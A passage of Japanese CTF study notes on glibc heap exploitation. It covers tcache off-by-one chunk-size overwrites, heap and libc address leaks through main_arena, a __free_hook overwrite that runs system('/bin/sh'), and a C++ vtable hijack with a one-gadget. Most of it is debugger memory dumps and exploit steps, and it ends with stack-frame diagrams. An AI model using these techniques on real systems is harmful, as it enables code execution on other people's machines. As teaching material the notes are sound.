0x18サイズをreadに対して"A"\*0x18(24バイト)を入力すると、   
```txt
0x555555757350:	0x0000000000000000	0x0000000000000021 <- 0x20サイズのチャンクの先頭。free済み
0x555555757360:	0x0000000000000000	0x0000000000000000
0x555555757370:	0x0000000000000000	0x0000000000000111  <- 0x20 chunkの後に0x110 chunkが存在

MENU
1. Alloc
2. Delete
3. Wipe
0. Exit
> 1
Input Size: 24
Input Content: AAAAAAAAAAAAAAAAAAAAAAAA

0x555555757350:	0x0000000000000000	0x0000000000000021
0x555555757360:	0x4141414141414141	0x4141414141414141 <- 0x20 chunkがtcache[0x20]から取り出されて
0x555555757370:	0x4141414141414141	0x0000000000000100 <- 0x111から0x100に変わった！！
                                                          これで0x100のtcacheをリンクできる！
```

##### off-by-one-errorでchunk sizeを書き換えてヒープのleak
off-by-one-errorでchunk sizeを書き換えて、tcacheを同じサイズをリンクすることで、ヒープのアドレスをleakする   
```txt
[1] 0x100サイズをmallocするようにしてfree (実際は0xf8(248)を要求) 
[2] 0x20サイズをmallocしてfree  (実際は0x18(24)を要求) 
[3] 0x110サイズをmallocしてfree (実際は0x108(264)を要求) 
[4] 0x20サイズを再度mallocして(実際は0x18)、0x18分をすべて埋めてoff-by-one-error
    0x20 chunkのすぐ下にある0x110 chunkのchunk sizeが0により、0x111→0x100に変わる
[5] 0x110サイズを再度mallocしてfree
    malloc時は0x110のtcache[0x110]の値(アドレス)を返し、その次のリンク(今はNULL)でtcache[0x110]を上書き
    free時に、malloc時に返されたアドレス-0x8の値(0x100)に対応するtcache[0x100]の値で、malloc時に返されたアドレスを上書き
    malloc時に返されたアドレスで、対応するtcache[0x100]の値を上書き
[6] show関数でmalloc時に返されたアドレスの値を表示できる
    今回はこのアドレスにはfree時に書き込まれたtcache[0x100]が値として存在
    
|   heap    heap |
|                |
|           0x101|
|                | <- tcache[0x100]
|                |
|                |
|    ~        ~  |
|                |
|           0x21 | 
|                | <- tcache[0x20]
|           0x111| <- ここを書き換える！！！
|                | <- tcache[0x110]
|                |
|                |

--------------------------------------------------------------
0x108サイズをmallocして、freeした後

tcachebins
0x20 [  1]: 0x555555757360 ◂— 0x0
0x100 [  1]: 0x555555757260 ◂— 0x0
0x110 [  1]: 0x555555757380 ◂— 0x0

pwndbg> x/16gx 0x555555757350
0x555555757350:	0x0000000000000000	0x0000000000000021
0x555555757360:	0x0000000000000000	0x0000000000000000
0x555555757370:	0x0000000000000000	0x0000000000000111
0x555555757380:	0x0000000000000000	0x0000000000000000

--------------------------------------------------------------
0x18サイズをmallocして、freeした後
この時、0x18サイズはすでにtcache[0x20]にあるので、tcache[0x20]の値(アドレス)が使われる！！
さらに下にHeapが伸びない！つまり下のやつを上書きできる！

> 1
Input Size: 24
Input Content: AAAAAAAAAAAAAAAAAAAAAAAA

tcachebins
0x100 [  1]: 0x555555757260 ◂— 0x0
0x110 [  1]: 0x555555757380 ◂— 0x0

0x555555757350:	0x0000000000000000	0x0000000000000021  
0x555555757360:	0x4141414141414141	0x4141414141414141  <- tcache[0x20]にあったアドレスを使った！
0x555555757370:	0x4141414141414141	0x0000000000000100  <- 0x100に変わった！
0x555555757380:	0x0000000000000000	0x0000000000000000

------------------------------------------------------------------
0x108サイズをmallocして、freeした後
mallocは0x108に対応した値tcache[0x110]=0x555555757380を返す

tcachebins
0x100 [  2]: 0x555555757380 —▸ 0x555555757260 ◂— 0x0

0x555555757350:	0x0000000000000000	0x0000000000000021
0x555555757360:	0x4141414141414141	0x4141414141414141
0x555555757370:	0x4141414141414141	0x0000000000000100
0x555555757380:	0x0000555555757260	0x0000000000000000 <- tcache[0x100]の値がfree時に書き込まれた！
                                     
-----------------------------------------------------------------
mallocで返されたアドレスの値を表示する

> 2
Content: '`ruUUU'    <- show関数でHeap領域のアドレス(0x0000555555757260)がリークできた！　
Remove? [y/n] n         showできるのはmallocが返したアドレス(0x108に対応するtcache[0x110]=0x555555757380)の値
```

##### off-by-one-errorとHeap leak+tcacheを7つリンク

```txt
[1] 0x100でmalloc,free (実際は248)
[2] 0x110でmalloc,free (実際は264)
[3] 0x120でmalloc,free (実際は280)
[4] 0x100で再度malloc,off-by-one-error,free
[5] 0x110で再度malloc,off-by-one-error,free
[6] 0x120で再度malloc,off-by-one-error,free
    この時、show関数で直前のmallocが返したアドレス470の値(360)を[6]のfree後に読むことでHeapleakできる！

[1],[2],[3]後                  [4],[5],[6]後

|   heap   heap   |          |   heap   heap   | 
|                 |          |                 |
|          0x100  |          |          0x100  |
|      0          | <- 260   | AAAAAA   AAAAA  |
|                 |          | AAAAAA   AAAAA  |
|                 |          |    ~         ~  |
|                 |          | AAAAAA   AAAAA  |
|          0x110  |          |          0x100  | <- [4]のoff-by-one-error
|      1          | <- 360   |  260     BBBBB  | <- [5]のfreeで、[4]でtcache[0x100]にfreeされた260が上書き
|                 |          | BBBBBB   BBBBB  |
|                 |          |    ~       ~    |
|                 |          | BBBBBB   BBBBB  |
|          0x120  |          | BBBBBB   0x100  | <- [5]のoff-by-one-error
|      2          | <- 470   |  360            | <- [6]のfreeで、[5]でtcache[0x100]にfreeされた360が上書き
|                 |          | CCCCCC   CCCCC  | <- [6]のoff-by-one-errorでこうなる。ここがmallocが返したアドレス

```
#### Heap overlap

```txt
--------------------------------------------------------------------------------
例１）main_arenaのアドレスleakの際に使用
状態：tcache[0x20]がoverlapしている。
再現方法：tcache[0x20]に入っているアドレス(0x555555757ab0)の値をaddr_leakに書き換える
(0x20)   tcache_entry[0](1): 0x555555757ab0 --> addr_leak(leakしたいものがあるアドレス) 
この後に0x20sizeを二回mallocすることで(freeは今回はどっちでもよい)、mallocがaddr_leakを返すようになる

                  top: 0x555555757c30 (size : 0x203d0)
       last_remainder: 0x555555757ac0 (size : 0x100) 
            unsortbin: 0x555555757ac0 (size : 0x100)
(0x20)   tcache_entry[0](1): 0x555555757ab0 --> 0x555555757ad0 (overlap chunk with 0x555555757ac0(freed) )
(0x100)   tcache_entry[14](6): 0x555555757800 --> 0x5555557576c0 --> 0x555555757590 --> 0x555555757470 --> 0x555555757360 --> 0x555555757260
gdb-peda$ x/32gx 0x555555757a60
0x555555757a60: 0x3636363636363636      0x3636363636363636
0x555555757a70: 0x3636363636363636      0x3636363636363636
0x555555757a80: 0x3636363636363636      0x0000000000000041
0x555555757a90: 0x0000555555757a80      0x0000555555757a80
0x555555757aa0: 0x0000000000000000      0x0000000000000041
0x555555757ab0: 0x0000555555757ad0      0x555555757000
0x555555757ac0: 0x0000000000000040      0x0000000000000101
0x555555757ad0: 0x00007ffff7dcfca0      0x00007ffff7dcfca0 <- tcache[0x20]の0x555555757ad0が0x00007ffff7dcfca0を指している！
0x555555757ae0: 0x3737373737373737      0x3737373737373737

--------------------------------------------------------------------------------
例2）system("/bin/sh")を呼び出し
状態：tcache[0x100]がoverlapしている
再現方法：tcache[0x100]に入っているアドレス(0x555555757ad0)の値を_free_hookに書き換える
(0x100)   tcache_entry[14](7): 0x555555757ad0  -> _free_hook(0x00007ffff7dd18e8)
この後に、2回0x100サイズをmallocすることで、mallocが_free_hookを返し、そこをaddr_libc_systemに書き換えられる！

                  top: 0x555555757c30 (size : 0x203d0)
       last_remainder: 0x555555757ac0 (size : 0x100) 
            unsortbin: 0x555555757ac0 (doubly linked list corruption 0x555555757ac0 != 0x7ffff7dcbd60 and 0x555555757ac0 is broken)
(0x20)   tcache_entry[0](255): 0x7ffff7dcfca0 --> 0x555555757c30
(0x40)   tcache_entry[2](1): 0x555555757ab0
(0x100)   tcache_entry[14](7): 0x555555757ad0 (overlap chunk with 0x555555757aa0(freed) )
gdb-peda$ x/32gx 0x555555757a60
0x555555757a60: 0x3636363636363636      0x3636363636363636
0x555555757a70: 0x3636363636363636      0x3636363636363636
0x555555757a80: 0x3636363636363636      0x0000000000000041
0x555555757a90: 0x0000555555757a80      0x0000555555757a80
0x555555757aa0: 0x0000000000000000      0x0000000000000041
0x555555757ab0: 0x0000000000000000      0x555555757010
0x555555757ac0: 0x5a5a5a5a5a5a5a5a      0x0000000000000101
0x555555757ad0: 0x00007ffff7dd18e8      0x00007ffff7dcfc00 <- tcache[0x100]の0x555555757ad0が0x00007ffff7dd18e8(_free_hook)を指している
0x555555757ae0: 0x3737373737373737      0x3737373737373737
```
#### Heap領域の上書きの利用
上書きしたいアドレスがある場合、その上のチャンク(低位のチャンク)のchunk sizeを大きめに書き換えるなりしてfreeでtcacheに入れておけば、 次回書き換えたsizeと同じsizeをmallocしたときに(書き換えたいアドレスの上のチャンクが返る)、多めに上書きできるので、アドレスを上書きできる。   
例)
```txt
0x555555757aa0:	0x0000000000000000	0x0000000000000021 <- この0x21を0x41に変えれば次に0x21のmallocでこのチャンクを指した後にfreeすることでtcache[0x40]に値を代入できる！
0x555555757ab0:	0x0000555555757ad0	0x5959595959595959
0x555555757ac0:	0x0000000000000040	0x0000000000000101    
0x555555757ad0:	0x00007ffff7dcfca0	0x00007ffff7dcfca0 <- このアドレスに書き込みたい！
         
         しかし、mallocが0x555555757ab0を返しているときにこのままfreeすると、
         0x20sizeの呼び出し時にこのアドレスがtcache[0x20]から変えることになり、上書きするのにサイズが小さすぎる！
         
         ox21を0x41に何らかの方法で上書きすれば、mallocが0x555555757ab0を返しているときにfreeすると,
         tcache[0x40]にこのアドレスが入り、次に0x40sizeのmallocの時にこのアドレスが返るため、0x20sizeのチャンクに0x40size分書き込める！
```

#### Heap問のlibc leak
main_arenaのアドレスをリークして、offset_libc_arenaで引くとlibc_baseが求まる。   
main_arenaを使用するのはunsorted_binsなので、tcacheを7つ埋めてunsorted_binsを使う。   
unsorted_binsはfd,bkメンバを持ち、ここにはmain_arenaのアドレスが格納される。   
このアドレスをリークする。   
```txt
tcache[0x20] -> 0x20サイズのチャンクのアドレス -> (main_arenaのアドレスが格納されているアドレス)   
```
とすると、0x20のmalloc,freeを2セットすることでリークできる！   

そのサイズを次回mallocすれば
```txt
-------------------------------------------------------------------------
[1] 0x160サイズをmallocして"A"*0x138+p64(0x41)+p64(0x0000555555757a80)+p64(0x0000555555757a80)で上書きして、free
    0x41サイズの偽のチャンクを作成。
[2] 0x20サイズをmallocして"Y"*0x10+p64(0x40)+p64(0x100)で上書きして、free
    これで、0x555555757acのチャンクをfreeするときにchunkの結合が発生する

tcachebins
0x20 [  1]: 0x555555757ab0 ◂— 0x0
0x100 [  7]: 0x555555757950 —▸ 0x555555757800 —▸ 0x5555557576c0 —▸ 0x555555757590 —▸ 0x555555757470 —▸ 0x555555757360 —▸ 0x555555757260 ◂— 0x0
0x170 [  1]: 0x555555757ad0 ◂— 0x0
                                                  tcache[0x100]の0x555555757950は0x160サイズのチャンクを[1]でfreeした結果
0x555555757a70:	0x4141414141414141	0x4141414141414141
0x555555757a80:	0x4141414141414141	0x0000000000000041 <- [1] [2]の0x41と同じ出ないとダメ
0x555555757a90:	0x0000555555757a80	0x0000555555757a80 <- [1] consolidate時のunlink()でエラーとならないような値をセット
0x555555757aa0:	0x0000000000000000	0x0000000000000021
0x555555757ab0:	0x0000000000000000	0x5959595959595959 <- [2] 0x20のmallocが返したアドレス。
0x555555757ac0:	0x0000000000000040	0x0000000000000100 <- [2] 0x40,0x100を書き込む (元0x170size)

-------------------------------------------------------------------------
0x170サイズのmalloc後　(0x555555757ac0がmallocに返された)
forward consolidateでエラーにならないように0x21の偽のチャンクを用意

0x555555757a70:	0x4141414141414141	0x4141414141414141
0x555555757a80:	0x4141414141414141	0x0000000000000041 <- このチャンクと結合されて、ここが0x141sizeのチャンクの先頭になる
0x555555757a90:	0x0000555555757a80	0x0000555555757a80    unsorted_binsはここを指すようになる
0x555555757aa0:	0x0000000000000000	0x0000000000000021
0x555555757ab0:	0x0000000000000000	0x5959595959595959
0x555555757ac0:	0x0000000000000040	0x0000000000000100 <- 0x100でPREV_INUSEがないので次のfree時にmalloc_consolidate()により、前のchunkと結合される
0x555555757ad0:	0x4141414141414141	0x4141414141414141
0x555555757ae0:	0x4141414141414141	0x4141414141414141
       ~                 ~                   ~
0x555555757ba0:	0x4141414141414141	0x4141414141414141
0x555555757bb0:	0x4141414141414141	0x4141414141414141
0x555555757bc0:	0x4141414141414141	0x0000000000000021 <- forward consolidateのため
0x555555757bd0:	0x0000000000000000	0x0000000000000000
0x555555757be0:	0x0000000000000000	0x0000000000000021 <- forward consolidateが発生しないように！

        freeするchunkの次の次のchunk(0x555555757be0)のPREV_INUSEが0のときforward consolidateが発生し、
        次のchunk(0x555555757bc0)に対してunlink()の処理が入る


-------------------------------------------------------------------------
0x170サイズのmalloc(0x555555757ac0をmallocに返された)のfree後

tcachebins
0x20 [  1]: 0x555555757ab0 ◂— 0x0
0x100 [  7]: 0x555555757950 —▸ 0x555555757800 —▸ 0x5555557576c0 —▸ 0x555555757590 —▸ 0x555555757470 —▸ 0x555555757360 —▸ 0x555555757260 ◂— 0x0
unsortedbin
all: 0x555555757a80 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x555555757a80

0x555555757a80:	0x4141414141414141	0x0000000000000141 <- 0x41から0x141に変わった！ (0x141のchunkが作成された！)
0x555555757a90:	0x00007ffff7dcfca0	0x00007ffff7dcfca0 <- fd,bkメンバにはmain_arenaのアドレス
0x555555757aa0:	0x0000000000000000	0x0000000000000021
0x555555757ab0:	0x0000000000000000	0x5959595959595959
0x555555757ac0:	0x0000000000000040	0x0000000000000100 <- ここをfreeしてbackward/forward consolidateが発生
0x555555757ad0:	0x4141414141414141	0x4141414141414141    ここのprev_size(0x40)+size(0x100)の合計が結合されて0x141のchunkが作成された！
0x555555757ae0:	0x4141414141414141	0x4141414141414141
       ~                 ~                   ~
0x555555757ba0:	0x4141414141414141	0x4141414141414141
0x555555757bb0:	0x4141414141414141	0x4141414141414141
0x555555757bc0:	0x0000000000000140	0x0000000000000020
0x555555757bd0:	0x0000000000000000	0x0000000000000000
0x555555757be0:	0x0000000000000000	0x0000000000000021

----------------------------------------------------------------------------------
Input Size: 248
Input Content: 0

tcachebins
0x20 [  1]: 0x555555757ab0 ◂— 0x0
0x100 [  6]: 0x555555757800 —▸ 0x5555557576c0 —▸ 0x555555757590 —▸ 0x555555757470 —▸ 0x555555757360 —▸ 0x555555757260 ◂— 0x0
unsortedbin
all: 0x555555757a80 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x555555757a80


0x555555757a70:	0x4141414141414141	0x4141414141414141
0x555555757a80:	0x4141414141414141	0x0000000000000141
0x555555757a90:	0x00007ffff7dcfca0	0x00007ffff7dcfca0
0x555555757aa0:	0x0000000000000000	0x0000000000000021
0x555555757ab0:	0x0000000000000000	0x5959595959595959
0x555555757ac0:	0x0000000000000040	0x0000000000000100
0x555555757ad0:	0x4141414141414141	0x4141414141414141
0x555555757ae0:	0x4141414141414141	0x4141414141414141
     ~                 ~                    ~
0x555555757ba0:	0x4141414141414141	0x4141414141414141
0x555555757bb0:	0x4141414141414141	0x4141414141414141
0x555555757bc0:	0x0000000000000140	0x0000000000000020
0x555555757bd0:	0x0000000000000000	0x0000000000000000
0x555555757be0:	0x0000000000000000	0x0000000000000021



----------------------------------------------------------------------------------------
0x40サイズをmallocして0x555555757a90を上書き(freeはしない)
unsorted_binsには0x140サイズのチャンクがあるので、0x140bytesのうち0x40だけ使う。
なので、unsorted_binsは0x555555757a80から0x555555757ac0に変わる。
(次にchunkが必要な時は0x555555757ac0から必要な分を切り取る)

mallocが返したアドレス0x555555757a90から書き込めるので、0x555555757ab0に0x0000555555757ad0を上書き
これで、0x0000555555757ad0にあるarena
以下の状況で、
[1] 0x20サイズのmalloc,free
[2] 0x20サイズのmalloc,free

tcachebins
0x20 [  1]: 0x555555757ab0 —▸ 0x555555757ad0 ◂— ...
0x100 [  6]: 0x555555757800 —▸ 0x5555557576c0 —▸ 0x555555757590 —▸ 0x555555757470 —▸ 0x555555757360 —▸ 0x555555757260 ◂— 0x0
unsortedbin
all: 0x555555757ac0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x555555757ac0

0x555555757a60:	0x4141414141414141	0x4141414141414141
0x555555757a70:	0x4141414141414141	0x4141414141414141
0x555555757a80:	0x4141414141414141	0x0000000000000041 <- 0x141から0x41に変わった！ もしfreeするとtcache[0x40]にこのチャンクが登録される
0x555555757a90:	0x00007ffff7000044	0x00007ffff7dcfdd0 <- mallocが返した0x555555757a90に書き込めるので
0x555555757aa0:	0x0000000000000000	0x0000000000000021 <- この0x21を0x41に変えれば次に0x21のmallocでこのチャンクを指した後にfreeすることでtcache[0x40]に値を代入できる！
0x555555757ab0:	0x0000555555757ad0	0x5959595959595959 <- tcache[0x20]に0x555555757ad0のリンクを追加
0x555555757ac0:	0x0000000000000040	0x0000000000000101    
0x555555757ad0:	0x00007ffff7dcfca0	0x00007ffff7dcfca0
0x555555757ae0:	0x4141414141414141	0x4141414141414141
0x555555757af0:	0x4141414141414141	0x4141414141414141
       ~                 ~                  ~
0x555555757ba0:	0x4141414141414141	0x4141414141414141
0x555555757bb0:	0x4141414141414141	0x4141414141414141
0x555555757bc0:	0x0000000000000100	0x0000000000000020
0x555555757bd0:	0x0000000000000000	0x0000000000000000
0x555555757be0:	0x0000000000000000	0x0000000000000021

----------------------------------------------------------------------------
0x20サイズのmalloc後、freeはしない
この図の場合はfreeすると0x555555757ab0でtcache[0x20]が上書きれてしまうので良くない。freeはしない

tcachebins
0x20 [  0]: 0x555555757ad0 ◂— ...
0x100 [  6]: 0x555555757800 —▸ 0x5555557576c0 —▸ 0x555555757590 —▸ 0x555555757470 —▸ 0x555555757360 —▸ 0x555555757260 ◂— 0x0
unsortedbin
all: 0x555555757ac0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x555555757ac0

0x555555757a60:	0x4141414141414141	0x4141414141414141
0x555555757a70:	0x4141414141414141	0x4141414141414141
0x555555757a80:	0x4141414141414141	0x0000000000000041
0x555555757a90:	0x00007ffff7000044	0x00007ffff7dcfdd0
0x555555757aa0:	0x0000000000000000	0x0000000000000021 <- この0x21を0x41に変えればfreeすることでtcache[0x40]に値を代入できる！
0x555555757ab0:	0x0000555555757ad0	0x5959595959595959 <- mallocが返したアドレス。mallocしたことでtcache[0x20]が0x0000555555757ad0に！
0x555555757ac0:	0x0000000000000040	0x0000000000000101
0x555555757ad0:	0x00007ffff7dcfca0	0x00007ffff7dcfca0
0x555555757ae0:	0x4141414141414141	0x4141414141414141
0x555555757af0:	0x4141414141414141	0x4141414141414141
       ~                 ~                   ~ 
0x555555757ba0:	0x4141414141414141	0x4141414141414141
0x555555757bb0:	0x4141414141414141	0x4141414141414141
0x555555757bc0:	0x0000000000000100	0x0000000000000020
0x555555757bd0:	0x0000000000000000	0x0000000000000000
0x555555757be0:	0x0000000000000000	0x0000000000000021


----------------------------------------------------------------------------
前のチャンクはfreeせず、0x20sizeをmalloc後

tcachebins
0x20 [ -1]: 0x7ffff7dcfca0 (main_arena+96)
0x100 [  6]: 0x555555757800 —▸ 0x5555557576c0 —▸ 0x555555757590 —▸ 0x555555757470 —▸ 0x555555757360 —▸ 0x555555757260 ◂— 0x0
unsortedbin
all: 0x555555757ac0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x555555757ac0

0x555555757a70:	0x4141414141414141	0x4141414141414141
0x555555757a80:	0x4141414141414141	0x0000000000000041
0x555555757a90:	0x00007ffff7000044	0x00007ffff7dcfdd0
0x555555757aa0:	0x0000000000000000	0x0000000000000021
0x555555757ab0:	0x0000555555757ad0	0x5959595959595959
0x555555757ac0:	0x0000000000000040	0x0000000000000101
0x555555757ad0:	0x00007ffff7dcfca0	0x00007ffff7dcfca0 <- mallocが返したアドレス。show関数でリークできる！
0x555555757ae0:	0x4141414141414141	0x4141414141414141
0x555555757af0:	0x4141414141414141	0x4141414141414141
       ~                 ~                   ~
0x555555757ba0:	0x4141414141414141	0x4141414141414141
0x555555757bb0:	0x4141414141414141	0x4141414141414141
0x555555757bc0:	0x0000000000000100	0x0000000000000020
0x555555757bd0:	0x0000000000000000	0x0000000000000000
0x555555757be0:	0x0000000000000000	0x0000000000000021
```
#### Heapでの system("/bin/sh")実行の流れ

```txt
------------------------------------------------------------------------------------
0x40サイズのmallocによって、偽のチャンクの0x555555757a90が返り、tcache[0x100]のnextに_free_hookアドレスを書き込んでfree後

(0x20)   tcache_entry[0](255): 0x7ffff7dcfca0 --> 0x555555757c30
(0x40)   tcache_entry[2](1): 0x555555757ab0
(0x100)   tcache_entry[14](7): 0x555555757ad0 (overlap chunk with 0x555555757aa0(freed) )
gdb-peda$ x/32gx 0x555555757a60
0x555555757a60: 0x3636363636363636      0x3636363636363636
0x555555757a70: 0x3636363636363636      0x3636363636363636
0x555555757a80: 0x3636363636363636      0x0000000000000041
0x555555757a90: 0x0000555555757a80      0x0000555555757a80
0x555555757aa0: 0x0000000000000000      0x0000000000000041 <- この偽のチャンクを使って_free_hookアドレスを書き込み、tcache[0x100]にoverlapさせる
0x555555757ab0: 0x0000000000000000      0x555555757010
0x555555757ac0: 0x5a5a5a5a5a5a5a5a      0x0000000000000101 <- freeすることでこの偽の0x100chunkに対応するtcache[0x100]に0x555555757ad0を代入(overlapする)
0x555555757ad0: 0x00007ffff7dd18e8      0x00007ffff7dcfc00 <- _free_hookを上書きした
0x555555757ae0: 0x3737373737373737      0x3737373737373737


    ch.alloc(0xf8, '0') [1]
    ch.wipe()

    ch.alloc(0xf8, p64(addr_libc_system)) [2]
    ch.wipe()

    ch.alloc(0x38, '/bin/sh') [3]
    ch.delete(False) [4]
    
[1] 次に0x100サイズmallocすれば、0x555555757ad0がmallocによって返り、nextの0x00007ffff7dd18e8がtcache[0x100]に入る

[2] そのあと、freeせずにまた0x100サイズmallocすれば、0x00007ffff7dd18eがmallocによって返り、_free_hookアドレスにp64(addr_libc_system)を書き込める！
    これで、次にfreeするとsystem関数が実行される！
    
[3] そのあと、freeせずに適当なサイズ(0x40とか)mallocし、"/bin/sh"をmallocが返したアドレスに書き込む

[4] この後にfreeすれば、system("/bin/sh")が実行される！
    free関数はfree(content)となっており、contentはmallocが返したアドレスを指している
    このとき、content(というアドレス)には"/bin/sh"という文字列が入っている
    なので、free(content)はsystem(content)と同じであり、content="/bin/sh"なのでsystem("/bin/sh")が実行される！

```

#### C++のvtableの書き換え
子クラスのメンバ関数を親クラスのポインタ経由で呼び出したとき、親クラスのメンバ関数ではなく子クラスのメンバ関数が呼びだされる。   
C++では`virtual`で装飾されているメンバ関数がこの動作をし、**vtable**(仮想関数テーブル)で実現される。   
```C++
// Birdクラス
struct Bird {
    string name() {return typeid(*this).name();};
    virtual void sing() = 0;     // sing()を仮想関数として宣言
    virtual ~Bird() = default;   // 子クラスで再定義できる
};

// Parrotクラスは publicで Birdクラスを継承
class Parrot: public Bird {
    string memory;
public:
    Parrot () {            // コンストラクタ(初期化) 
        cout<<"Input: ";
        cin>>memory.data();   // この部分にHeap overflowの脆弱性 cin>>memory; とするべき
                              // _M_local_bufの0x10サイズ以上を書き込むことで次のstringの_M_pを上書きできる
    }
    void sing() override {cout<<memory.c_str()<<endl;} // overrideで親クラスのsing()を再定義
};

Bird *cage[4];  // 親クラスBirdのポインタ

// 子クラスParrotのオブジェクトを親クラスBirdのポインタ経由で生成
// newの内部でmallocが実行され、Heapのアドレスがcage[0]に代入される
void malloc() {
    cage[0] = new Parrot();  // 子クラスParrotのオブジェクトを生成
}

// 親クラスBirdのポインタcage経由で子クラスParrotのメンバ関数sing()を呼び出す
void show() {
    cage[0]->sing();       // 子クラスParrotのsing()が呼びだされる
}
```
親クラスBirdのポインタcage経由で子クラスParrotのメンバ関数sing()を呼び出す際の動作   
```txt

 Birdクラス(親)のポインタ*cage
0x605380 |                      |
0x605388 |  Parrot_object_addr  | <- [1] Birdクラスのポインタcage[0] (0x001010)
0x605390 |                      |

 Parrotクラス(子)のobject [Heap]
0x001000 |     prev_size        |
0x001008 |     chunk size       | <- Birdクラスのポインタcage
0x001010 | Parrot_vtable+0x10   | <- [2] Parrotのvtableへのアドレス (0x604d10) new Parrot()がこのアドレスを返す
0x001018 |　      _M_p          | <- 文字列のポインタ (0x001028)
0x001020 |   _M_string_length   |
0x001028 |     _M_local_buf     | <- 文字列のサイズは0x10 cin>>memory.data()はここに書き込まれる
0x001030 |       ......         | <- prev_sizeは使用済み
0x001038 |     chunk size       | 
0x001040 |     vtable+0x10      |
0x001048 |　      _M_p          | <- 文字列のポインタ (0x001028)
0x001050 |   _M_string_length   |
0x001058 |    _M_local_buf      |

 Parrotのvtable
0x604d00 |         0x0          | <- 多重継承に使う情報
0x604d08 |     typeinfo_addr    | 
0x604d10 |  Parrot.sing()_addr  | <- [3] Parrotクラスの仮想メンバ関数のアドレス
```
**Heap leak**   
```txt
_M_p(文字列のポインタ)を書き換えて、既知の任意のアドレスの値を読みだす！
Heapをleakするには、mallocが返すアドレスがある変数のアドレスの値をleakする！
2つ分のchunkをmallocしておいて、一つ目をfreeして、Heap overflowで2つ目の_M_pを書き換える

 Birdクラス(親)のポインタ*cage
0x605380 |                      |
0x605388 |  Parrot_object_addr  | <- Heapのアドレスが書き込まれている！ (0x001010)
0x605390 |                      |

 Parrotクラス(子)のobject [Heap]
0x001000 |     prev_size        |
0x001008 |     chunk size       | 
0x001010 | Parrot_vtable+0x10   | 
0x001018 |　      _M_p          | 
0x001020 |   _M_string_length   |
0x001028 |     _M_local_buf     | <- "A"*8
0x001030 |       ......         | <- "A"*8
0x001038 |     chunk size       | <- p64(0x31) chunk sizeの0x31を書き換えないように
0x001040 |     vtable+0x10      | <- p64(0x604d10) 書き換えないように
0x001048 |　      _M_p          | <- p64(0x605388) cage変数のアドレス
0x001050 |   _M_string_length   |
0x001058 |    _M_local_buf      |

```
**libc leak**
```txt
Heap leakとほぼ同じ
libcをleakするには、すでに呼びだされた関数(libc_start_mainなど)のGOTにあるlibcのアドレスをleakする！

 Parrotクラス(子)のobject [Heap]
0x001000 |     prev_size        |
0x001008 |     chunk size       | 
0x001010 | Parrot_vtable+0x10   | 
0x001018 |　      _M_p          | 
0x001020 |   _M_string_length   |
0x001028 |     _M_local_buf     | <- "A"*8
0x001030 |       ......         | <- "A"*8
0x001038 |     chunk size       | <- p64(0x31) chunk sizeの0x31を書き換えないように
0x001040 |     vtable+0x10      | <- p64(0x604d10) 書き換えないように
0x001048 |　      _M_p          | <- p64(0x604fe8) libc_start_mainのGOT_addr 
0x001050 |   _M_string_length   |
0x001058 |    _M_local_buf      |
```
**one-gadget-rce**
```txt
Heap leak, libc leakが前提条件
Heapのvtableの場所に書かれている関数が実行されるので、Heapにone-gaget-rceのアドレスを書き込んでそのアドレスにvtableの場所を書き換える

 Parrotクラス(子)のobject [Heap]
0x001000 |     prev_size        |
0x001008 |     chunk size       | 
0x001010 | Parrot_vtable+0x10   | 
0x001018 |　      _M_p          | 
0x001020 |   _M_string_length   |
0x001028 |     _M_local_buf     | <- "A"*8
0x001030 |       ......         | <- "A"*8
0x001038 |     chunk size       | <- p64(0x31) chunk sizeの0x31を書き換えないように
0x001040 |     vtable+0x10      | <- p64(0x001048) このアドレスにはメンバ関数のアドレスが書かれていた
0x001048 |　      _M_p          | <- p64(0x7fffffff12345678) 偽のvtable(一個上)がここを指している
0x001050 |   _M_string_length   |
0x001058 |    _M_local_buf      |

```
## よく見るかたまり
#### 関数の先頭
```txt
Func1:
push arg1
push arg2
call Func2

Func2:
push ebp
mov ebp, esp
sub esp, 100h
```
```txt
call 直前    ->     push ebp 直前  ->  mov ebp, esp 直前  -> sub esp, 100h 直前   ->  sub esp, 100h 直後
(Low)
|      |            |        |         |         |          |         |              |         | __ esp 
|      |            |        |         |         |          |         |              |   ...   | 
|      |            |        |         |         |          |         |              |   100h  |
|      |            |        |         |         | __ esp   |         | __ esp,ebp   |   ...   | __ ebp
|      |            |        | __ esp  |saved_ebp|          |saved_ebp|              |saved_ebp|
|      | __ esp     | F1_ret |         | F1_ret  |          | F1_ret  |              | F1_ret  |
| arg1 |            |  arg1  |         |  arg1   |          |  arg1   |              |  arg1   | 
| arg2 |            |  arg2  |         |  arg2   |          |  arg2   |              |  arg2   |
| ...  | __ ebp     |  ...   | __ ebp  |   ...   | __ ebp   |   ...   |              |   ...   |
|      |            |        |         |         |          |         |              |         |
(High)
```
#### 関数の終わり
```txt
Func1:
push arg1
push arg2
call Func2

Func2:
...
mov esp,ebp
pop ebp
ret
```
```txt
mov esp,ebp 直前 -> pop ebp 直前        ->     ret 直前    ->     ret 直後   
(Low)
|         | __ esp  |         |             |         |         |         |
|   ...   |         |   ...   |             |   ...   |         |   ...   |
|   100h  |         |   100h  |             |   100h  |         |   100h  |
|   ...   | __ ebp  |   ...   | __ ebp,esp  |   ...   |         |   ...   |
|saved_ebp|         |saved_ebp|             |saved_ebp| __ esp  |saved_ebp|
| F1_ret  |         | F1_ret  |             | F1_ret  |         | F1_ret  | __ esp
|  arg1   |         |  arg1   |             |  arg1   |         |  arg1   |
|  arg2   |         |  arg2   |             |  arg2   |         |  arg2   |
|   ...   |         |   ...   |             |   ...   | __ ebp  |   ...   | __ ebp
|         |         |         |             |         |         |         |
(High)
```
#### main関数の状態

```txt
main関数は　<__libc_start_main+231> から呼ばれる。
saved_rbpは　0x400970 (<__libc_csu_init>)で以外と小さい
rbpは<__libc_csu_init>を指しており、その下にリターンアドレスがある

gdb-peda$ tel $rbp-0x30 20
0000| 0x7fffffffde60 --> 0x0 
0008| 0x7fffffffde68 --> 0x0 
0016| 0x7fffffffde70 --> 0x0 
0024| 0x7fffffffde78 --> 0x0 
0032| 0x7fffffffde80 --> 0x7fffffffdf70 --> 0x1 
0040| 0x7fffffffde88 --> 0x293133f802e74a00 
